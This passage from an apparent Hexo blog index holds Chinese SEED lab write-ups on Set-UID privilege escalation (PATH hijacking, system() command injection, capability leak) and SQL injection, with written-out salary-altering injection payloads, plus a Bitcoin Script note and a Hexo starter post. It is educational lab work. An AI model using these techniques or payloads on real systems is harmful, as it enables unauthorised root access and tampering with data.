src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140943286.png"></p><p>可以观察到两个文件只有文件名不同，其余环境变量均相同，说明在Linux中子进程继承了父进程除名字外的所有环境变量。</p><h3 id="2-3-Task3：环境变量与execve"><a href="#2-3-Task3：环境变量与execve" class="headerlink" title="2.3 Task3：环境变量与execve()"></a>2.3 Task3：环境变量与execve()</h3><p>本任务中，我们研究通过execve() 运行一个新程序，环境变量是如何受影响的。函数execve() 调用系统调用来加载新命令并执行它；这个函数永远不会返回。没有创建新进程；相反，调用进程的代码段、数据段、bss 段和栈被加载的程序覆盖。本质上，execve() 在调用进程中运行了新程序。我们对环境变量发生了什么感兴趣；它们会被新程序自动继承吗？</p><p>Step1：编译并运行给出程序，描述观察。如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140943684.png"></p><p>可以看到该程序编译运行后没有打印任何内容</p><p>Step2：修改execve()的调用内容，重新编译并运行程序，描述观察。如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140944354.png"></p><p>可以观察到该程序会输出打印当前文件下的所有环境变量。</p><p>Step3：请就新程序如何获得其环境变量得出你的结论。</p><p>首先对execve()函数进行分析，可以得到其有三个参数如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140944722.png"></p><p>其中filename是一个二进制可执行文件，argv是调用程序执行的参数序列，也就是我们要调用程序所需要传入的参数，envp是参数序列作为新程序的环境。</p><p>在第一步中，新程序的环境输入为NULL，表示终止符，并未输入键值对作为环境变量，因而其输出打印的结果为空，而在第二步中将environ作文新程序的环境输入，该指针变量指向包含所有环境变量的一个列表，因而将其赋予新进程即可以打印出当前所有的环境变量。</p><h3 id="2-4-Task-4：环境变量和system"><a href="#2-4-Task-4：环境变量和system" class="headerlink" title="2.4 Task 4：环境变量和system()"></a>2.4 Task 4：环境变量和system()</h3><p>本任务中，我们研究通过system() 运行一个新程序，环境变量是如何受影响的。system() 也是用来执行一个命令的，但是和execve() 直接执行一个命令不同，system() 实际上执行“&#x2F;bin&#x2F;sh -c command”，即它先执行&#x2F;bin&#x2F;sh，然后让shell 执行这个command。</p><p>如果你查阅system() 函数的实现，你会发现它使用execl() 来执行&#x2F;bin&#x2F;sh；execl() 调用execve()，并将环境变量数组传递给它。因此，使用system() 时，调用进程的环境变量会传递给新程序&#x2F;bin&#x2F;sh。请编译并运行以下程序来验证这一点。</p><p>首先对system函数进行分析，其用于执行shell（Linux&#x2F;Unix系统）命令，只有一个参数command，即命令名。调用进程的环境变量会传递给新程序&#x2F;bin&#x2F;sh，运行结果如下图，会打印出当前的环境变量</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140945125.png"></p><h3 id="2-5-Task-5：环境变量与Set-UID程序"><a href="#2-5-Task-5：环境变量与Set-UID程序" class="headerlink" title="2.5 Task 5：环境变量与Set-UID程序"></a>2.5 Task 5：环境变量与Set-UID程序</h3><p>Set-UID 是Unix 系统中重要的安全机制。当Set-UID 程序执行时，它将获得程序拥有者的权限。如果程序执行者是root，所有执行该程序的人都将以root 权限执行该程序。Set-UID 使得我们可以做许多有趣的事情，但是在执行Set-UID 程序时，会提高执行者的权限，这是有风险的。尽管Set-UID 的行为是由他们的程序逻辑所决定的，而不是用户决定的，用户却可以通过环境变量来修改Set-UID 的行为。为了理解Set-UID 程序是如何被影响的，我们首先弄清楚Set-UID 程序的环境变量是否由用户程序继承而来。</p><p>Step1：编写所给出的程序，打印当前进程的所有环境变量。</p><p>Step2：编译上述程序得到foo，将其所有者更改为root，并使其成为一个Set-UID程序</p><p>Step3：在shell中设置给出的环境变量，这些环境变量是在普通用户的shell 进程中设置的。在你的shell 中运行第2 步中的Set-UID程序。在shell 中键入程序名后，shell 会fork 一个子进程，并使用子进程来运行该程序。请检查你在shell进程（父进程）中设置的所有环境变量是否都进入了Set-UID 子进程。描述你的观察。如果你有惊奇的发现，请描述它们。</p><p>首先编写给出程序，并且将其设置为Set-UID程序，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140946892.png"></p><p>然后查看所给出变量是否存在，并且利用export命令设置环境变量如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140946056.png"></p><p>可以观察到在shell中本来只有PATH存在。</p><p>在子进程中查看环境变量，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140947096.png"></p><p>可以看到PATH和MYENV环境变量被继承，而LD_LIBRARY_PATH并未被继承。</p><h3 id="2-6-Task6：PATH环境变量和Set-UID程序"><a href="#2-6-Task6：PATH环境变量和Set-UID程序" class="headerlink" title="2.6 Task6：PATH环境变量和Set-UID程序"></a>2.6 Task6：PATH环境变量和Set-UID程序</h3><p>由于调用了shell 程序，在Set-UID 程序中调用system() 是非常危险的。这是因为shell 程序的实际行为会受到环境变量的影响，例如PATH 环境变量；这些环境变量由用户提供，可能是恶意的。通过更改这些变量，恶意用户可以控制Set-UID 程序的行为。</p><p>利用所给出的程序实现攻击步骤如下所示：</p><p>首先编写该程序，并且执行，发现该程序可以打印当前目录下的文件，结果如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140947368.png"></p><p>修改当前目录到PATH环境变量的首部，然后将&#x2F;bin&#x2F;cal文件复制到当前目录下，并且命名为ls，重新执行命令ls，可以发现其作用被修改。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140948525.png"></p><p>其次再将所编写的程序设置为Set-UID程序</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140948908.png"></p><p>重新执行task6程序，可以观察到其实在执行cal命令，原因在于PATH环境变量的首部被修改为了当前目录，而在调用system函数执行命令的时候，会在PATH环境变量中的目录按顺序进行查找是否有当前命令，因而可以实现攻击。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140948220.png"></p><p>如果不是将cal而是把zsh复制到当前目录中，便可以成功得到当前系统的超级用户特权如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140949623.png"></p><p>与此同时打印当前的id信息如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140949871.png"></p><p>可以观察到当前执行实在seed用户下的，并未以root权限运行，根据手册中的提示，关掉保护策略后，重复上述攻击，可以观察到结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140949332.png"></p><p>可以看到euid&#x3D;0，当前代码是以root程序运行的。</p><h3 id="2-7-Task7：LD-PRELOAD环境变量和Set-UID程序"><a href="#2-7-Task7：LD-PRELOAD环境变量和Set-UID程序" class="headerlink" title="2.7 Task7：LD_PRELOAD环境变量和Set-UID程序"></a>2.7 Task7：LD_PRELOAD环境变量和Set-UID程序</h3><p>在这个任务中，我们研究Set-UID 程序如何处理某些环境变量，包括LD_PRELOAD、LD_LIBRARY_PATH和其他LD_* 如何影响动态加载器&#x2F;链接器的行为。动态加载器&#x2F;链接器是操作系统(OS) 的一部分，它加载（从持久性存储到RAM）并链接可执行文件在运行时所需的共享库。</p><p>在Linux 中，ld.so 或ld-linux.so 是动态加载器&#x2F;链接器（用于不同类型的二进制文件）。在影响其行为的环境变量中，本实验关注LD_LIBRARY_PATH 和LD_PRELOAD。在Linux 中，LD_LIBRARY_PATH 是一组以冒号分隔的目录，应首先在其中搜索库，然后是标准目录集。LD_PRELOAD 指定了要在所有其他库之前加载的附加的用户指定的共享库的列表。在这个任务中，我们将只研究LD_PRELOAD。</p><p>Step1：按照实验手册指导构建动态链接库</p><p>Step2：在不同条件下运行myprog，观察发生现象。</p><p>Case1：普通程序，普通用户执行，可以看到程序正常运行：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140950807.png"></p><p>case2：set-uid特权程序，普通用户执行，停顿后并未调用库函数：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140950868.png"></p><p>case3：set-uid特权程序，在root下重新设置LD_PRELOAD环境变量，并执行，可以观察到程序正常运行：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140950677.png"></p><p>case4：使myprog 为一个Set-UIDUser1 程序（User1 是程序的所有者，是另一个用户账户），在另一个用户账户下重新加LD_PRELOAD 环境变量，并执行它,新建用户并将该myprog修改为Set-UIDUser1 程序，执行后如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140951249.png"></p><p>Step3：原因解释，在step2中执行每种情况的同时打印每一次当前状态下的LD_PRELOAD 环境变量，即可观察到原因</p><p>当一个正常程序的时候，子进程会继承这个环境变量；当他是一个SETUID程序的时候，子进程没有继承该环境变量；所有者是user1，即使有环境变量也不可以调用，我们可以得出这种继承策略是一种很好的保护策略。</p><h3 id="2-8-Task8：使用system-和execve-调用外部程序的对比"><a href="#2-8-Task8：使用system-和execve-调用外部程序的对比" class="headerlink" title="2.8 Task8：使用system()和execve()调用外部程序的对比"></a>2.8 Task8：使用system()和execve()调用外部程序的对比</h3><p>尽管system() 和execve() 都可以被用于执行新的程序，但是system() 在高特权态下更加危险，比如Set-UID 程序。在前面的任务里，我们看到了PATH 环境变量是如何影响system() 的行为的，因为该变量会影响shell 的工作。execve() 则没有这个问题，因为它不调用shell。除了环境变量，调用shell还有另外危险的结果。</p><p>Step1：编译所给出程序，使其成为set-uid程序，进行攻击如下：</p><p>首先编译并修改后，运行该程序，可以看到该进程会利用cat打印出文件内容</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140954057.png"></p><p>然后我们尝试打印&#x2F;etc&#x2F;shadow，属于root权限下才可以读的文件，发现不允许：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140954885.png"></p><p>关掉系统的保护策略后重新读取，发现可以成功读取，如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140955377.png"></p><p>由于程序种调用了system函数，在传递参数的时候没有将代码和数据进行分离，因而可以利用构造参数，使前者作为函数参数后者作为命令执行，进行得到系统超级权限，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140955212.png"></p><p>得到root权限后便可以随意删除没有写权限的文件，因而bob可以损害系统的完整性。</p><h3 id="2-9-Task9：权限泄露"><a href="#2-9-Task9：权限泄露" class="headerlink" title="2.9 Task9：权限泄露"></a>2.9 Task9：权限泄露</h3><p>为了遵循最小权限原则，Set-UID 程序如果不再需要这种权限，它会永久地放弃root 权限。此外，有时程序需要将其控制权交给用户，在这种情况下，root 权限必须被撤销。setuid() 系统调用可以用来撤销权限。根据手册，setuid() 设置调用进程的有效用户ID。如果调用者的有效UID 是root，真实的UID和保存的set-user-id 也被设置。因此，如果一个有效UID 为0 的Set-UID 程序调用setuid(n)，则该进程将成为正常进程，其所有的UID 都设置为n。</p><p>当撤销权限的时候，最常见的错误就是权限泄露。该进程可能在它仍然享有特权时已经获得了一些特权功能。当特权降级时，如果程序没有清理这些功能，则它们仍然可以由非特权进程访问。换句话说，虽然进程的有效用户ID 变为非特权，但是该进程仍具有特权，因为它具有特权能力。编译以下程序，将其所有者更改为root，并使其成为Set-UID 程序。以普通用户身份运行程序。你能利用这个程序中的权限泄漏漏洞吗？目标是以普通用户身份写入&#x2F;etc&#x2F;zzz 文件。</p><p>攻击步骤如下：</p><p>首先对所给出的漏洞程序进行编译，并且修改为setuid程序</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140955034.png"></p><p>然后尝试对&#x2F;etc&#x2F;zzz文件进行写入，发现没有权限，原因在于，当前状态下，该程序的euid已经修改为了普通用户而非root权限</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140956755.png"></p><p>但是由于当前该程序仍然在执行，而且在程序中打开了文件后，并未进行合法的关闭与退出，因而我们可以根据所打印出的文件描述符fd进行文件写入，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140956822.png"></p><p>可以看到攻击成功，将自己的文本写入了zzz文件中，针对于这种攻击，修补方法便是销毁文件描述符，即关闭文件。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scripts</title>
      <link href="/2022/11/11/Scripts/"/>
      <url>/2022/11/11/Scripts/</url>
      
        <content type="html"><![CDATA[<h1 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h1><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>比特币交易脚本语言    一种类似Forth（1960s的编程语言）的逆波兰表达式的基于堆栈的执行语句</p><span id="more"></span><h2 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h2><p>用该脚本语言编写在UTXO上的锁定脚本和解锁脚本         当一笔比特币交易被验证时，每一个输入值中的解锁脚本与其对应的锁定脚本同时执行，用以确定这笔交易是否满足支付条件          该语言被设计为在执行范围上有限制，类似于嵌入式装置。处于其安全特性用于验证可编程货币</p><h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><h3 id="1-图灵非完备性-turing-incompleteness"><a href="#1-图灵非完备性-turing-incompleteness" class="headerlink" title="1.图灵非完备性 turing incompleteness"></a>1.图灵非完备性 turing incompleteness</h3><p>scripts 有许多操作码，除了有条件的流控制以外，没有循环或复杂的流控制能力 确保了其图灵非完备性，脚本有限的复杂性和可预见的执行次数  </p><p>必要性：该限制确保了该语言不会被创造无限循环类似的逻辑炸弹，从而被攻击者植入在交易中，引起对于比特币网络的DOS攻击。防止交易验证机制被作为漏洞利用</p><h3 id="2-无状态验证"><a href="#2-无状态验证" class="headerlink" title="2.无状态验证"></a>2.无状态验证</h3><p>比特币脚本语言是无状态的，脚本在执行前后不会被保存。因此执行脚本的所有信息都包含在脚本中，因而脚本在任何系统上的执行方式都是相同的。一个人验证了脚本，就可以确保在比特币网络中的所有其他系统也验证了这个脚本，因此一个有效的交易对于所有人都是有效的。这种对于结果的可预见性保障了比特币系统的良好性质。</p><h2 id="脚本构建"><a href="#脚本构建" class="headerlink" title="脚本构建"></a>脚本构建</h2><p>比特币交易引擎依赖于两种脚本进行验证交易</p><p>锁定脚本：放置在输出上的花费条件——指定了今后花费这笔输出必须要满足的条件。   锁定脚本也被叫做 scriptPubKey，因为它其中包含一个公钥或者是比特币地址。</p><p>解锁脚本：一个解决或者是满足被锁定脚本在一个输出上所设定的花费条件的脚本，它将允许输出被消费。是每一笔比特币交易输入的一部分，包含由用户输入的私钥生成的数字签名 ScriptSig </p><p>验证过程：每一个比特币验证节点通过同时执行以上两个脚本来验证一笔交易     每个输入包含一个解锁脚本并且指向先前存在的UTXO。验证软件将会复制解锁脚本，检索输入所用的UTXO并且从这个UTXO上复制锁定脚本。然后依次执行解锁脚本和锁定脚本，若满足条件，则输入是有效的。 UTXO永久记录在区块链中，只有满足输出条件的有效交易才可以将其是做花费用掉并且从 UTXO set中删除。</p><p><img src="C:\Users\19577\AppData\Roaming\Typora\typora-user-images\image-20221109151633839.png" alt="image-20221109151633839"></p><h2 id="脚本执行栈"><a href="#脚本执行栈" class="headerlink" title="脚本执行栈"></a>脚本执行栈</h2><p>比特币脚本语言使用了栈这种数据结构。</p><p>脚本语言通过从左到右处理每一个项目来执行脚本    数据被压入栈中，操作码从栈中取出一个或者多个参数，运算他们之后可能将结果再压入栈中。</p><p>条件操作码：对条件进行判断，产生一个布尔结果。</p><h2 id="简单的脚本"><a href="#简单的脚本" class="headerlink" title="简单的脚本"></a>简单的脚本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 OP_ADD 5 OP_EQUAL   <span class="literal">true</span> </span><br></pre></td></tr></table></figure><p>计算2+3的和并且判断其是否等于5</p><p>输入解锁脚本即为 2   锁定脚本为3 OP_ADD 5 OP_EQUAL 代入可得正确解</p><h2 id="分开执行解锁脚本和锁定脚本"><a href="#分开执行解锁脚本和锁定脚本" class="headerlink" title="分开执行解锁脚本和锁定脚本"></a>分开执行解锁脚本和锁定脚本</h2><p>2010发现存在允许异常解锁脚本推送数据入栈并且污染锁定脚本的漏洞。当前版本两个脚本随着栈的传递分开执行  首先执行解锁脚本，在执行过程中没有报错，在主函数栈中复制并执行锁定脚本，判断结果是否为true</p><p>锁定脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OP_DUP OP_HASH160 &lt;Cafe Public Key Hash&gt; OP_EQUALVERIFY OP_CHECKSIG</span><br></pre></td></tr></table></figure><p>解锁脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Cafe Signature&gt; &lt;Cafe Public Key&gt;</span><br></pre></td></tr></table></figure><p>组合后的验证脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Cafe Signature&gt; &lt;Cafe Public Key&gt; OP_DUP OP_HASH160 &lt;Cafe Public Key Hash&gt; OP_EQUALVERIFY OP_CHECKSIG</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hello</title>
      <link href="/2022/11/10/hello-world/"/>
      <url>/2022/11/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><span id="more"></span><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL injection Lab</title>
      <link href="/2022/10/20/SQLinjection/"/>
      <url>/2022/10/20/SQLinjection/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>SQL 注入是一种代码注入技术，利用 Web 应用程序和数据库服务器之间接口的漏洞。当用户的输入没有被 Web 应用程序正确检查就被发送到后端数据库服务器时，就会出现 SQL 注入漏洞。很多 Web 应用程序从用户处获取输入，并使用用户输入来构建 SQL 查询，以获得数据库中的数据信息。Web 应用程序也使用 SQL 查询在数据库中进行数据信息的存储。这些都是 Web 应用程序开发中的常见做法。如果没有仔细构造 SQL 查询，则可能会出现 SQL 注入漏洞。SQL 注入攻击是对 Web 应用程序最常见的攻击之一。</p><span id="more"></span><p>在本实验中，我们创建了一个易受 SQL 注入攻击的 Web 应用程序，它包含许多 Web 开发人员常犯的错误。实验的目标是找到利用 SQL 注入漏洞的方法，展示攻击所能造成的伤害，并掌握防御此类攻击的技术。本实验覆盖以下主题:</p><p>1. SQL 语句：SELECT 与 UPDATE</p><p>2. SQL 注入</p><p>3. 语句预处理</p><h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：熟悉-SQL-语句"><a href="#2-1-Task-1：熟悉-SQL-语句" class="headerlink" title="2.1 Task 1：熟悉 SQL 语句"></a>2.1 Task 1：熟悉 SQL 语句</h3><p>Task 1 的目标是通过使用提供的数据库来熟悉 SQL 命令。Web 应用程序所使用的数据存储在 MySQL数据库中，由 MySQL 容器托管。我们创建了一个名为 sqllab_users 的数据库，其中包含一个名为credential 的表。表中存储着每个员工的个人信息（例如 eid、password、salary、ssn 等）。本任务中，请通过操作数据库熟悉 SQL 查询语句。运行手册中所给出命令后，你需要使用一条 SQL 命令打印员工 Alice 的所有资料信息。请提供结果截图。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151934509.png"></p><p>如上图所示，使用语句select * from credential where Name&#x3D;’Alice’;即可得到并打印Alice的所有资料信息。</p><h3 id="2-2-Task-2：基于SELECT语句的SQL注入攻击"><a href="#2-2-Task-2：基于SELECT语句的SQL注入攻击" class="headerlink" title="2.2 Task 2：基于SELECT语句的SQL注入攻击"></a>2.2 Task 2：基于SELECT语句的SQL注入攻击</h3><p>攻击者通过 SQL 注入技术可以执行恶意 SQL 语句，即恶意负载。通过恶意的 SQL 语句，攻击者可以从数据库中窃取数据，甚至对数据库进行修改。我们的 Web 应用程序数据库含有 SQL 注入漏洞，模仿了开发人员的常犯错误。在登陆网站<a href="http://www.seed-server.com中进行/">www.seed-server.com中进行</a> SQL 注入攻击的练习，登录页面见图 1。Web 应用程序根据用户名和口令认证用户，所以只有知道自己口令的员工才能登录。作为攻击者，请在无法得知任何员工口令的前提下成功登录 Web 应用程序。</p><h4 id="Task-2-1-基于网页的-SQL-注入攻击"><a href="#Task-2-1-基于网页的-SQL-注入攻击" class="headerlink" title="Task 2.1 基于网页的 SQL 注入攻击"></a>Task 2.1 基于网页的 SQL 注入攻击</h4><p>你的任务是以管理员的身份从登录页面登录到 Web 应用程序，这样你就可以查看所有员工的信息。管理员的用户名是 admin，口令未知。请在用户名与口令输入框中输入能成功完成攻击的内容。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151935882.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151936746.png"></p><p>如上图所示，在用户名框输入以上内容，即可成功登入管理员界面。其原理如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151937038.png"></p><p>在输入如上内容后，数据库中执行了上图中所展示的命令，#作为注释符，其后面的内容便无需再验证，即可成功进入管理员页面。</p><h4 id="Task-2-2-基于命令行的-SQL-注入攻击"><a href="#Task-2-2-基于命令行的-SQL-注入攻击" class="headerlink" title="Task 2.2 基于命令行的 SQL 注入攻击"></a>Task 2.2 基于命令行的 SQL 注入攻击</h4><p>在不使用网页的情况下完成 Task 2.1 的目标。你可以使用命令行工具，如 curl，它可以发送 HTTP 请求。如需在 HTTP 请求中包含多个参数，需要把 URL 和参数用一对单引号括起来。否则，用于分隔参数的特殊字符 (如 &amp;) 会被 shell 曲解，造成命令歧义。以下给出向Web 应用程序发送带有两个参数（username 和 Password）的 HTTP GET 请求的示例。</p><p>首先我们尝试输入正确的的用户名和口令，可以得到如下所示的结果。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151937183.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151939901.png"></p><p>然后我们进行SQL注入攻击，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151940274.png"></p><p>我们可以观察到两次得到相同的结果，证明在命令行中SQL注入攻击实现成功。</p><h4 id="Task-2-3-增加一条新的-SQL-语句"><a href="#Task-2-3-增加一条新的-SQL-语句" class="headerlink" title="Task 2.3 增加一条新的 SQL 语句"></a>Task 2.3 增加一条新的 SQL 语句</h4><p>在 Task 2.1 与 Task 2.2 中，我们只能做到从数据库中窃取信息，进一步的攻击是通过登录页面上的相同漏洞对数据库的数据进行修改。请尝试在 SQL 注入攻击中使用两条SQL 语句，第二条是更新或删除语句。在 SQL 中，分号（;）被用来分隔两条 SQL 语句。请在登录页面使用两条 SQL 语句进行攻击。</p><p>首先在登录页面中进行尝试，得到如下报错：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151940588.png"></p><p>然后再命令行中进行尝试，同样得到报错如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151940111.png"></p><p>但是我们在数据库中直接运行以分号间隔的两条指令时，可以得到如下结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151940179.png"></p><p>发现并未产生报错，说明在数据库中是支持两条指令的执行的。根据报错，我们可以在网站的源码中找到如下代码：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151941931.png"></p><p>报错发生在query过程中，经过上网查询，可以得知，query函数执行针对数据库的某个查询，要实现多个语句的执行，需要将其修改为支持多个查询的multi_query函数，修改如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151941333.png"></p><p>重新在命令行中进行SQL注入攻击，可以得到如下结果，未发生报错，说明语句成功执行。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151941904.png"></p><h3 id="2-3-Task-3：基于UPDATE语句的SQL注入攻击"><a href="#2-3-Task-3：基于UPDATE语句的SQL注入攻击" class="headerlink" title="2.3 Task 3：基于UPDATE语句的SQL注入攻击"></a>2.3 Task 3：基于UPDATE语句的SQL注入攻击</h3><h4 id="Task-3-1-：修改自己的工资"><a href="#Task-3-1-：修改自己的工资" class="headerlink" title="Task 3.1 ：修改自己的工资"></a>Task 3.1 ：修改自己的工资</h4><p>编辑页面中只能修改员工的昵称、电子邮件、地址、电话号码和口令，而不能用于修改工资。假设你 (Alice) 由于老板 Boby 今年未给你加薪而感到不满。你想利用存在于编辑页面的SQL 注入漏洞来增加自己的工资。请展示你是如何实现这一目标的。已知列 salary 用于存储工资数额。首先我们使用Alice正确的用户名和口令进入自己的页面，可以得到如下结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151943088.png"></p><p>可以观察到其工资为20000，然后在编辑页面进行如下操作：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151943132.png"></p><p>修改后再观察自己的页面，可以发现攻击成功，工资变为99999</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151943791.png"></p><p>但是在数据库中，打印所有员工信息时，发现所有人的工资都被修改为了99999，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151944937.png"></p><p>这样的攻击容易被发现，通过研究发现，原因在于注释后没有限定语句，因而将所有人的工资都进行了修改，需要把原有的语句修改为</p><table><thead><tr><th>muyoo’,salary&#x3D;99999 where Name&#x3D;’Alice’; #</th></tr></thead></table><p>即可单独修改Alice的工资。</p><h4 id="Task-3-2：修改他人的工资"><a href="#Task-3-2：修改他人的工资" class="headerlink" title="Task 3.2：修改他人的工资"></a>Task 3.2：修改他人的工资</h4><p>在提高自己的工资数额后，你决定惩罚你的老板 Boby，将他的工资减少到1 美元。请展示你是如何实现这一目标的。</p><p>在Alice的编辑页面中NickName一项中输入如下指令：</p><table><thead><tr><th>‘,salary&#x3D;1 where Name&#x3D;’Boby’; #</th></tr></thead></table><p>即可成功修改Boby的工资，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151944484.png"></p><h4 id="Task-3-3：修改他人的口令"><a href="#Task-3-3：修改他人的口令" class="headerlink" title="Task 3.3：修改他人的口令"></a>Task 3.3：修改他人的口令</h4><p>修改完 Boby 的工资后，你仍心有不甘，所以你想修改 